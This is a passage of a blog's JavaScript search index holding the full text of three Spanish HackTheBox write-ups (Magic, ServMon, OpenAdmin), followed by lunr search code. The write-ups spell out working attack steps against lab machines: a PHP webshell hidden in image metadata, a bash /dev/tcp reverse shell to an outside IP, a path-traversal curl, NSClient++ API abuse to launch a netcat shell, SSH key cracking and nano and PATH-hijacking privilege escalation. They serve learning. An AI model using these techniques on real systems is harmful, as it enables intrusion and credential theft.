    "body": "2020/08/22 - M√°quina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking.  TL;RD (Spanish writeup):  Explico a veces a muy bajo nivel ya que me enfoco en la gente que esta super perdida en este mundo (como yo), por si vez mucho texto ya sabes la raz√≥n. Enumeraci√≥n. : Como es habitual, vemos que servicios est√° corriendo la maquina, en este caso con los par√°metros normales el escaneo va lento, as√≠ que le agregamos algunos para evitarlo. $ nmap -p- --open -v -n --min-rate=5000 10. 10. 10. 185 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los puertos       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -n   Evita que realice Host Discovery, como resoluci√≥n DNS       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos       -oG   Guarda el output en un archivo con formato grepeable    Con la funci√≥n que maneja s4vitar podemos extraer los n√∫meros de los puertos del archivo initScan. En este caso se puede ver innecesario, pero si la m√°quina estuviera corriendo muchos puertos, evitar√≠amos tener que estar copiando uno a uno los puertos.  La ejecuci√≥n es sencilla, solo se debe agregar la funci√≥n al archivo $ ~/. bashrc $ extractPorts initScan Ahora un escaneo para verificar las versiones y scripts que est√°n manejando los servicios encontrados, en este caso el SSH(22) y el HTTP(80). $ nmap -sC -sV -p22,80 10. 10. 10. 185 -oN portScan      Par√°metro   Descripci√≥n         -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -p   Escaneo de los puertos obtenidos       -oN   Guarda el output en un archivo    Bien, nada relevante por ahora, a ver la web que tiene o. O Vemos varias im√°genes y algunos gif, nada relevante, vamos al apartado login. php. Si logramos entrar podremos subir archivos.  El login no tiene nada interesante. Decido hacer un reconocimiento por fuerza bruta con dirsearch a ver si hay algo escondido por ah√≠. $ dirsearch. py -u http://10. 10. 10. 185/ -E -x 403 Con -x excluyo las peticiones con el numero del status code 403, en este caso las peticiones en las que el servidor se niega a responder Bueno ac√° empieza mi aprendizaje con esta m√°quina, precisamente vi un directo del master master S4vitar y toco este tema que mostrar√©. En ese momento no ten√≠a ni idea que Magic ten√≠a esto Al ver la imagen, se ve algo interesante, un archivo upload. php con status code 302, que hace alusi√≥n a un redirect, lo que quiere decir en este caso que al querer ingresar a upload. php nos va a redirigir a login. php, as√≠ de sencillo, entonces para poder ver upload. php se debe evitar el redirect. Con BurpSuite se puede interceptar la trama y modificar el status code, pasando de 302 (redirect al login) a un 200 (en el que el servidor entender√° que todo esta OK y podremos ver el contenido de upload. php El procedimiento ser√≠a as√≠:  Habilitar la recepci√≥n de respuestas por parte del servidor en BurpSuite  Interceptar la petici√≥n de upload. php, oprimir Forward para procesar la petici√≥n y as√≠ obtener la respuesta OK  Como se coment√≥ antes, la idea es cambiar el redirect (302) por un OK (200) para que me deje ver el contenido. Se oprime Forward y esto es lo que responde: Perfe, veo el contenido de upload. php, para solventar el problema de que si queremos volver a visitar upload. php nos va a redireccionar de nuevo a login. php, podemos asignar una regla en Burp que si recibe una petici√≥n en el header con 302 me la cambie por un 200 Ahora intentaremos subir una imagen . jpg con contenido php, un simple Remote Command Execution (RCE) Interceptando la petici√≥n con Burp se ver√≠a as√≠ Dando clic en Forward responde  Pues NO, no es tan f√°cil. Tomando en cuenta algunos CTF y el nombre de la m√°quina Magic ca√≠ en cuenta de los Magic Numbers de los archivos. B√°sicamente son signaturas que establecen que tipo de archivo se est√° trabajando, se identifican viendo el archivo en formato hexadecimal, el tipo de archivo lo dictaran generalmente los primeros 4 bytes  Peque√±a info sobre magic numbers. As√≠ que cambiando los primeros bytes usando $ hexeditor por los correspondientes a un archivo JPEG:  JPEG File Interchange Format - . jpg - ff d8 ff e0 Quedar√≠a as√≠ el archivo y su tipo. Antes: Despu√©s, adem√°s agregaremos 4 bytes al inicio (4 puntos) para que no sobreescriba lo que ya tenemos  Y finalmente tenemos el archivo A ver si logro pasar el filtro e. e OOOKKKOKOKKKK‚Ä¶ imagen arriba Al intentar verla sale error, lo m√°s probable y obvio es que la imagen al no tener contenido de imagen y solo c√≥digo php no entiende como interpretarla. El siguiente paso ser√≠a subir el . htaccess con las instrucciones que le permitan al servidor interpretar los archivos . jpg como php. En ese caso nos dejar√≠a ver la imagen y ejecutar el c√≥digo. Pero despu√©s de probar no logre burlar el bypass para subir el . htaccess. As√≠ que ac√° volv√≠ a aprender algo: Toda imagen maneja metadatos, que serian los datos dentro del dato, algunos ejemplos de lo que recolecciona ser√≠a: el tama√±o, fecha de creaci√≥n, usuario que la modifico o la creo‚Ä¶ Creo que ya se entiende la idea. Consultando por internet, encontr√© que se pueden usar los metadatos para ejecutar un backdoor. En este caso dentro de un tag de los metadatos, puedo ingresar el c√≥digo php (o lo que sea), que posteriormente el navegador lo interpretar√° y ejecutar√°. Usaremos $ exiftool para ver y editar los metadatos.  img-upload-rce-cheat-sheet ocultar-codigo-php-en-una-imagen1. Obtener cualquier imagen2. Agregar metadato maliciosoImagen antes: Imagen despu√©s de insertar el tag modificado:  Va el c√≥digo php que permitira desde la misma url (GET) pasarle la instrucci√≥n a ejecutar en el sistema.  __halt_compiler() hace que el servidor no ejecute los datos de la propia imagen. 3. Cambiar la extensi√≥n de la imagen de . jpg a . php. jpg y subirla Perfecto, podemos ejecutar comandos, ahora intentaremos obtener una Shell reversa. http://10. 10. 10. 185/images/uploads/23. php. jpg?cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 15. 69/1233 0&gt;&amp;1'Pero no hace nada, pasando la consulta a URL Encode, quedar√≠a as√≠: http://10. 10. 10. 185/images/uploads/23. php. jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10. 10. 15. 69%2F1233%200%3E%261%27 Listo, estamos dentro :) Lo siguiente (√≥ptimo, necesario, preferible) es hacer tratamiento de la tty (entorno de entrada y salida de texto), ya que la Shell que tenemos no es completamente interactiva, ac√° me apoyo de s4vitar (a√∫n no me aprendo los pasos :P)  Video de s4vitar explicando. Y ahora a enumerar‚Ä¶ Hay varios archivos interesantes en $ ls /var/www/Magic.  El archivo db. php5 tiene unas credenciales, que coinciden con el √∫nico usuario que hay en el sistema aparte de root: theseus.  Pero probando $ su theseus no es v√°lida. As√≠ que no va por ah√≠ (por no leer bien el archivo, ya veremos por que), tambi√©n est√° el archivo index. php el cual tiene la generaci√≥n del banner inicial con todas las im√°genes y adem√°s valida si alguna tiene algo relacionado con php o dem√°s cosas extra√±as. Pero de los archivos el unico interesante es db. php5 que claramente nos tiene que servir para algo ya que tiene credenciales. Revisandolo bien (ahora si) se ve que la conexion la esta haciendo a una base de datos MySQL, pero el sistema al hacer $ mysql no lo reconoce, asi que primero intente hacer una conexion remota por medio de ssh, pero no servia, despues de buscar formas no encontre nada, asi que simplemente hice el auto completado normal cuando se quiere evitar escribir toda la instruccion o programa, entonces al hacer $ mysql + TAB TAB, me mostro varias opciones que se pueden usar mediante mysql.  Hay varias opciones, leyendo en internet sobre algunas interesantes encontr√©: $ mysqlshow -u theseus -p Nos indicara informacion estructural de la base de datos. (La -p har√° que la consola pida la pw, en este caso se usa la encontrada en db. php5) Siguiendo la estructura de la base de datos encontrada y su tabla, lo que se encontrar√≠a se mostrar√≠a as√≠ Pero de ac√° no puedo encontrar info que me sirva para explotar el servicio. Tambien hay un programa que me permite extraer un tipo de backup de la creacion de tablas, data y de la propia base de datos. Como cuando se hace un export de una base de datos en MySQL Admin. $ mysqldump -u theseus -p MagicMagic, que ser√≠a la base de datos encontrada con $ mysqlshow.  En las ultimas instrucciones se ve que ingresa a la base de datos un usuario llamado admin con una contrase√±a. Si usamos esa password con el usuario theseus logramos obtener una shell con √©l. ‚Ä¶ Escalada de privilegios: Revisando los permisos que tiene theseus me indica que no puede correr nada como $ sudo. Asi que mirando la info de los grupos relacionados encontre que esta en uno llamado users, me dio curiosidad as√≠ que si buscamos que archivos del sistema estan catalogados a ese grupo, vemos que solo hay uno, /bin/sysinfo (es un archivo que no habia visto antes y que mi sistema base no reconoce). Al ejecutarlo, exactamente trae info (alguna) del sistema. Para ver que hace por detras y como puede estar haciendolo se pueden usar varias herramientas (strace, ltrace, strings, cat). Yo mostrar√© con strings ya que se ve claro el vector de ataque.  Como se ve esta ejecutando 4 instrucciones, entre ellas $ fdisk (ayuda a la gestion y administracion del espacio en el disco duro). Con 3 de esas aplicaciones puedo lograr la explotacion y escalada de privilegios, basicamente por que la tarea esta siendo llamada por el usuario root, asi que todas las tareas tendran ese plus. El metodo de explotacion se llama path hijacking. Basicamente lo que hace es que como siempre al ejecutar algun programa el sistema va a buscarlo en algun directorio del path $ echo $PATH, entonces (en este ejemplo) pueda que fdisk este en /usr/bin/fdisk, el atacante se aprovecha de eso agregando en el path algun directorio donde √©l tenga un archivo llamado fdisk con instrucciones que hagan lo que el quiera.  Otra explicaci√≥n: linux-privilege-escalation-using-path-variable. Pero como todo se aprende y se entiende en la practica, vamo a darle. La explotacion es sencilla, encontrarla me llevo un tiempito :P  Guardar la instruccion que queremos que haga fdisk.  Darle todos los permisos al archivo.  Actualizar el PATH para que inserte el directorio donde esta el archivo fdisk creado y ademas agregarle el $PATH que ya tiene actualmente.  Ejecutar el binario $ /bin/sysinfo que llamara nuestro fdisk. Pero al ejecutarlo por alguna raz√≥n que no entiendo no me muestra el output As√≠ que diciendole que me haga otra ReverseShell pero ya con el user root ejecuta: Perfectowow soy root, ac√° las flags :) ‚Ä¶ Es mi primera maquina Medium pero no se me dificulto tanto. Siguiendo el consejo de s4vitar, hay que darle a cualquier maquina, ya que nos podemos estar perdiendo de mucho aprendizaje, practicando, viendo videos y leyendo mucho he logrado avanzar mas de lo que tenia pensado. A darle duro, a romper todo (las maquinas tambien :P) Muy buena maquina, me gusto mucho ademas de experimentar por primera vez con un secuestro de ruta. Encantado de poder brindarle algo de conocimiento a alguien, muchas gracias por querer aprender y no ponerte limites (: "
    }, {
    "id": 75,
    "url": "http://localhost:4000/htb/servmon",
    "title": "HackTheBox - ServMon",
    "body": "2020/06/20 - M√°quina Windows nivel f√°cil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador.  TL;DR (Spanish writeup): Esta m√°quina fue muy interesante, un m√©todo de explotaci√≥n que a mi parecer me dejo loco (por como se hace y por el tiempo que me demore en entenderlo), tambi√©n a pesar de a veces ser super lenta y que las personas la reiniciaban demasiado por usar un exploit equivocado. Mediante el servicio FTP encontraremos archivos interesantes, que nos daran algunos usuarios (o posibles rabbit holes :P)Explotaremos un Local File Inclusion dentro del servicio NVMS 1000, para asi encontrar un archivo con contrase√±as y probarlas con los usuarios obtenidos. Luego con el usuario Nadine, tendremos acceso a la maquina para tener la primera flag. Despues a traves del servicio NSClient++ y del aplicativo nsclient++. ini encontraremos una contrase√±a, posiblemente del administrador. Y finalmente obtendremos una shell como admin mediante la API del servicio. ‚Ä¶ Fases:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n: Demosle al escaneo de servicios con los que cuenta el host. $nmap -v -p- --open --min-rate=5000 -Pn -oG initScan 10. 10. 10. 184      Parametro   Descripci√≥n         -v   Para que nos muestre en la shell lo que va descubriendo       -p-   Escanea todos los puertos       ‚Äìopen   Muestra solo los puertos abiertos       -min-rate   Le decimos que no haga peticiones menores a 5000, sin esto, el escaneo va lento       -Pn   Evitamos que haga resolucion DNS por cada peticion y ademas que haga host discovery (ping)       -oG   Guarda el output en un archivo tipo grep, ya veremos por que    Usaremos una funci√≥n de S4vitar mediante el cual extraeremos los puertos y con la herramienta xclip a nuestra clipboard, evitando tener que copiar todos los puertos uno a uno.  $nmap -sV -sC -p21,22,80,135,139,445,5666,6063,6699,8443,49667,49669,49670 10. 10. 10. 184 -oN portScan      Param   Descripci√≥n         -sV   Nos permite ver las versiones de los servicios       -sC   Muestra todos los scripts relacionados con el servicio       -oN   Guarda el output en un archivo    Tenemos estos servicios corriendo:  21: FTP, adem√°s con el acceso Anonymous habilitado 22: SSH, quiz√°s para entrar con alg√∫n usuario 80: HTTP, Una p√°gina web 445: SambaEmpezaremos con el servicio FTP  Tenemos 2 archivos y 2 usuarios  Nathan NadineEn la interfaz de FTP podemos usar &gt; get &lt;nombredelarchivo&gt; para descargarlo a nuestra ubicaci√≥n actual.  Curioso, Nadine le indica a Nathan que ella dej√≥ el archivo Password. txt en su Escritorio. Por otro lado tenemos unos pasos a realizar, pero no tiene relevancia a√∫n. De ac√° no tenemos nada m√°s, as√≠ que veamos el servidor web.  Podemos inspeccionar, probar credenciales por default en los input, inyectar sentencias SQL, pero no encontramos nada. Vemos algo llamado NVMS-1000, busquemos que es y si podemos encontrar alg√∫n exploit.  NVMS-1000 seg√∫n la busqueda, es un software para el control y gesti√≥n de camaras.  Encontramos un . txt, relacionando un Directory Path Traversal, lo que nos permite ver archivos del sistema en el que est√° corriendo la p√°gina, que normalmente no deber√≠amos ver. ‚Ä¶ Explotaci√≥n: Podemos relacionar lo encontrado anteriormente con FTP, ya que sabiendo que Windows tiene normalmente en su ra√≠z una carpeta llamada c:\Users y tenemos 2 usuarios, pero realmente uno es el que nos interesa, Nathan y que tiene en su escritorio el archivo Password. txt, entonces realizando la consulta quedar√≠a as√≠. Usar√© cURL: $curl --path-as-is -v http://10. 10. 10. 184/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /Users/Nathan/Desktop/Passwords. txt      Par√°metro   Descripci√≥n         -path-as-is   Toma la petici√≥n con los ‚Äú/. . ‚Äù, sin esto hace el request a http://10. 10. 10. 184/Users/Nathan/Desktop/Passwords. txt y pues este path no funciona       -v   Para ver que est√° pasando por detr√°s del request    Perfecto, tenemos credenciales, veamos si alguna es de alg√∫n usuario. $ssh nadine@10. 10. 10. 184password: L1k3B1gBut7s@W0rk Listos, tenemos la flag del usuario. Veamos los √∫ltimos 18 caracteres.  ‚Ä¶ Escalada de privilegios: Bas√°ndonos en el escaneo de puertos, recordamos que hab√≠a un servicio llamado NSClient++ corriendo sobre el puerto 8443, ¬øDe qu√© trata y que podemos encontrar de √©l en Windows? Ac√° empieza la locura, despu√©s de momentos sin entender nada, buscando alg√∫n exploit para NSClient++, se encontr√≥ uno en el que indica que debemos crear un archivo . bat el cual har√° una conexi√≥n a netcat, con lo que necesitamos subir ese . bat, ponernos en escucha y ejecutarlo para tener una reverse Shell. Interesante, pero como subimos el archivo‚Ä¶ En la documentaci√≥n de NSClient++ hay una API en la cual, podemos subir scripts, ejecutar scripts, borrar, etc. . (Tambi√©n se puede hacer con el entorno gr√°fico, pero cuando hice la m√°quina iba muy lento). Los pasos del exploit de nsclient++ encontrado: Buscando por internet, sabemos que el archivo nsclient++. ini guardaba la contrase√±a del administrador :P Siguiendo el POC realizaremos esto:  Subir nc. exe (netcat) y el archivo . bat a Windows.  Subir el archivo . bat al NSCLient++ como script con la API, Ponernos en escucha mediante nc (netcat), esperando la conexi√≥n del script.  Ejecutar el script con la ayuda la API.  Conseguir la Shell como Administrador. &gt; Subir nc. exe (netcat) y el archivo . bat a Windows: Descargar el ejecutable de netcat desde la web y crear √©l . bat Usando scp podemos transferir mediante SSH archivos, siempre y cuando tengamos credenciales del objetivo.  &gt; Subir el archivo . bat al NSCLient++ como script con la API: Buscar muy bien en la documentaci√≥n, entender y hacer, llevo su tiempo, pero fue interesante. $curl -k -i -u admin https://localhost:8443/api/v1/scripts/ext?all=truePrimero vemos los scripts actuales que maneja la app. (Adem√°s tambi√©n para probar que todo va bien :P). Nos va a pedir la pw que ya encontramos en el nsclient++. ini.  Listo, ahora lo que haremos ser√° agregar el queesesto. bat como un script $curl -i -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts\c:\Temp\lana. bat --data-binary @lana. bat Ac√° usamos PUT para ‚Äúponer‚Äù, indic√°ndole donde est√° el archivo y donde queremos subirlo, en este caso en /scripts. Ahora, como hacemos para ejecutarlo, buscando y buscando, en la documentaci√≥n hace referencia a /queries, en los cuales dentro de cada uno hay unos atributos y comandos, uno de ellos tiene una instrucci√≥n de ejecuci√≥n. Veamos que queries hay. $curl -k -i -u admin https://localhost:8443/api/v1/queries/ Al final vemos que se cre√≥ un tipo JSON con informaci√≥n relacionada con nuestro script.  Ya se ve el comando execute y hace referencia al script agregado.  execute_url : https://localhost:8443/api/v1/queries/queesesto/commands/execute &gt; Ponernos en escucha mediante nc (netcat). : Finalmente, poni√©ndonos en escucha en nuestra m√°quina por el puerto 443, que fue el que definimos en el . bat obtendremos la Shell. $nc -lnvp 443&gt; Ejecutar el script con la ayuda de la API. : $curl -k -i -u admin https://localhost:8443/api/v1/queries/queesesto/commands/execute&gt; Conseguir la Shell como Administrador. : Y‚Ä¶ estamos dentro como usuario administrador :)))))  Debo decir que am√© esta forma de intrusi√≥n. ‚Ä¶ Buena maquina, en su momento estaba muy lenta y adem√°s las personas por seguir el exploit de internet al pie de la letra pues reseteaban la m√°quina, lo cual hacia peor el proceso. Pero bueno, encantado y muchas gracias por leer. "
    }, {
    "id": 76,
    "url": "http://localhost:4000/htb/openadmin",
    "title": "HackTheBox - OpenAdmin",
    "body": "2020/05/02 - Maquina Linux nivel f√°cil. Jugaremos con inspecci√≥n de c√≥digo, peticiones web, movimientos internos con Apache, con SSH keys y romperemos /bin/nano.  Esta m√°quina es 90% de enumeraci√≥n, veamos cu√°les son los pasos que seguiremos.  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n: Empecemos con el escaneo de red, usaremos nmap, el cual nos dar√° informaci√≥n sobre que puertos y servicios est√°n corriendo sobre la m√°quina. $ nmap -sC -sV -p- --open -T4 -oN initialScan 10. 10. 10. 171      Param   Description         -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver las versiones de los servicios       -p-   Escaneo de todos los puertos       ‚Äìopen   Muestra solo los puertos abiertos       -T4   Agresividad con la que hace el escaneo (-T{1-5})    Tenemos estos servicios corriendo:  22: SSH, probablemente nos sirva m√°s adelante 80: HTTP, empezaremos por ac√° a ver que tiene la p√°gina webVeamos el servidor web.  Ok‚Ä¶ . _. nos muestra la p√°gina por default de apache, as√≠ que usaremos herramientas que hacen fuerza bruta para ver si hay directorios o archivos activos. En este caso usaremos dirsearch. $ dirsearch -u http://10. 10. 10. 171/ -e html,php,js,json Si le queremos indicar que busque cualquier extensi√≥n, se usa -E Encontramos una carpeta y un archivo HTML. El HTML, nos redirecciona a la misma p√°gina por default. Al ingresar a /music, nos muestra: Despu√©s de recorrer la p√°gina y encontrar solo hoyos de dudas, entre al apartado Login. Si nos fijamos, al tener el mouse sobre √©l, nos indica que nos mover√° a una nueva carpeta llamada/ona.  Ac√° hay algo importante y es que, siendo una sola web, ¬øno deberia estar /ona dentro de music, osea /music/ona?, esto toma fuerza mas adelante :P no nos volvamos locos tan pronto.  La p√°gina ya nos da informaci√≥n importante, estamos corriendo un servicio llamado Open Net Admin y su versi√≥n 18. 1. 1  OpenNetAdmin es un sistema para el seguimiento de las propiedades de la red IP en una base de datos. Basicamente permite rastrear toda la info gueardada en una base de datos sobre una IP. ‚Ä¶ Explotaci√≥n: Despu√©s de varios hoyos de dudas y sin saber que hacer con la interfaz, buscamos en Linux a trav√©s de una tool muy buena searchsploit que directamente es exploidb pero en la terminal.  Exploit Database es una base de datos que aloja exploits y seguimientos a vulnerabilidades.  Para nuestra versi√≥n solo nos sirven los dos √∫ltimos, usaremos el que no dispone de metasploit. Con searchsploit podemos indicarle que nos deje ver el exploit y copiarlo a nuestro entorno (y muchas cosas m√°s)       Par√°metro   Descripci√≥n         -x, ‚Äìexamine   Ver el contenido del exploit       -m, ‚Äìmirror   (aka copies) un exploit a nuestro entorno actual    B√°sicamente encontramos:  Se deber√° ejecutar sobre bash Recibe como primer par√°metro la URL Est√° enviando por medio de curL la data, env√≠a el formato est√°ndar que recibe xajax, pero tambi√©n nos permite agregar comandos ${cmd} para al final mandarla a la ${URL}. Algo impirtante es que no estamos obteniendo una shell, simplemente estamos haciendo command execution, no podremos movernos a una carpeta en especifico, pero si podemos ver su contenido (cat) y listarlo (ls) Al ejecutar el exploit, nos da varios errores‚Ä¶ Despues de buscar cual era el error, encontramos que el archivo esta en formato DOS (windows). Usamos la herramienta dos2unix que practicametne lo dice su nombre, convierte de *dos to unix**.  ¬°Listo! Enumeracion y enumeracion, andando de carpeta en carpeta :) Hay 3 usuarios disponibles,  www-data: en el que estamos jimmy joanna Bien, conseguimos una pw. Veamos si es de alguno de los dos usuarios por medio de SSH $ ssh jimmy@10. 10. 10. 171Sip!! Entramos al perfil de jimmy, sigamos enumerando. No pondre todas las trampas en las que cai ;) pero encontramos algo despues de todo. Si utilizamos el comando id notamos que estamos dentro del grupo internal. Veamos desde la raiz del sistema que archivos son de jimmy y estan asignados al grupo internal $ find / -user jimmy -group internal Fijemonos en main. php.  Si conseguimos entrar a /main. php se ejecutara una consulta al id_rsa (private key) dentro del home de joanna, as√≠ que veamos como hacer esa consulta. Arriba en el exploit se usaba curL para enviar la data a una URL especificada. ¬øAc√° no es acaso lo mismo? ¬øsolo que en vez de data queremos entrar en un archivo dentro de una carpeta? $ curl http://10. 10. 10. 171/internal/main. phpPero esto simplemente nos muestra: . . . &lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;                                     &lt;h1&gt;Not Found&lt;/h1&gt;         &lt;p&gt;The requested URL was not found on this server. &lt;/p&gt;&lt;hr&gt;. . . As√≠ que ac√° toma fuerza lo que hab√≠amos olvidado arriba, sobre si est√°bamos trabajando en una sola web. Resulta que podemos configurar un sistema para que internalmente podamos alojar varios dominios sobre el mismo servidor, esto se llama Virtual Host, en este caso tenemos:  10. 10. 10. 171/music 10. 10. 10. 171/ona 10. 10. 10. 171/marga 10. 10. 10. 171/artworkEntonces el curL de arriba estar√≠a mal, dado que no hay ning√∫n dominio llamado internal, pero probando sin √©l, tampoco obtenemos respuesta. Entonces la respuesta debe estar internamente en la configuraci√≥n del servidor. As√≠ que vayamos a la configuraci√≥n de apache2 en /etc/apache2, revisando cada carpeta encontramos dentro de /sites-enabled dos archivos y en uno de ellos.  Hay un VirtualHost corriendo sobre el localhost en el puerto 52846 en el que la informaci√≥n que esta alojando esta en /var/www/internal (que es la que vimos relacionada con main. php). As√≠ que ac√° ya cambia la cosa, podemos hacer una petici√≥n‚Äôon con curL sobre esa info.  Perfecto, siempre tuvimos la pista en frente‚Ä¶ (internal) Guardamos esa llave en un archivo. Intentamos conectarnos mediante la llave indicandole $ ssh -i file user@host pero nos pide una password phrase para el private key que le estamos ingresando. Asi que debemos crackear mediante la llave la password del user :) Hay varias herramientas, usaremos ssh2john. py que efectivamente hace lo que necesitamos. Al ejecutarlo obtenemos el hash que en este caso con john nos ayuda perfecto.  Obtenemos la password, intentando de nuevo la conexion, logramos entrar como joanna.  ‚Ä¶ Escalada de privilegios: Listones, inicialmente tenemos la flag user. txt. Tambien tenemos permisos como administrador a traves del binario /bin/nano (que es un editor de texto) sobre el archivo /opt/priv, lo que quiere decir que todo lo que hagamos con ese archivo lo estaremos haciendo como root.  Buscando por internet nos encontramos con la herramienta GTFOBins, que nos provee de una gran lista de como los binarios Unix pueden ser explotados, asi que busquemos algo sobre nano. Nos dice que dentro de un archivo ejecutado por nano tenemos la opcion de ejecutar comandos oprimiendo Ctrl R + Ctrl X, aca podemos hacerlo de varias formas, obtener una Shell o simplemente eacribir los comandos y recibir la respuesta.  Para obtener una shell pondriamos, reset; sh 1&gt;&amp;0 2&gt;&amp;0 y tendriamos una shell como root O pasandole los comandos, nos imprimiria la respuesta en el mismo archivo /opt/priv.  Y vemos la flag del usuario root.  "
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p style='color: rgb(57, 16, 87);'>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult' style='color: rgb(57, 16, 87);'>No he encontrado esa locura, intenta de nuevo :P</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title' style='color: rgb(57, 16, 87);'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><small><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult' style='color: rgb(57, 16, 87);'>No he encontrado esa locura, intenta de nuevo ;)</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});